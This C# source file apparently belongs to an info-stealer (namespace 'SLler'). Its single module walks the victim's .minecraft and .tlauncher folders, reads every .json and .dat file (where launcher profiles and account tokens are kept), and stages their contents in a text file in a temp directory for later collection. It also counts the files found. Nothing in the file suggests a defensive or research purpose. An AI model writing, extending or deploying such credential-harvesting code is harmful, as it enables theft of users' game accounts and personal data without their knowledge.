namespace SLler
{
	public static class Minecraft
	{
		public static void SLMinecraft()
		{
			string[] paths = {
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".minecraft"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData", "Roaming", ".tlauncher")
	};

			var saveToDir = Path.Combine(Settings._tempDir, "Games", "Minecraft");
			Directory.CreateDirectory(saveToDir);

			var savePath = Path.Combine(saveToDir, "Minecraft Data.txt");

			List<string> collectedData = new List<string>();

			foreach (string path in paths)
			{
				if (Directory.Exists(path))
				{
					Settings._minecraftCount += Directory.GetFiles(path).Length; 
					foreach (string file in Directory.GetFiles(path))
					{
						if (file.EndsWith(".json") || file.EndsWith(".dat"))
						{
							try
							{
								collectedData.Add($"==== {Path.GetFileName(file)} ====");
								collectedData.Add(File.ReadAllText(file));
								collectedData.Add("");
							}
							catch (Exception ex)
							{
								collectedData.Add($"Ошибка чтения файла {file}: {ex.Message}");
							}
						}
					}
				}
			}

			if (collectedData.Count > 0)
			{
				File.WriteAllText(savePath, string.Join(Environment.NewLine, collectedData));
			}
		}
	}
}
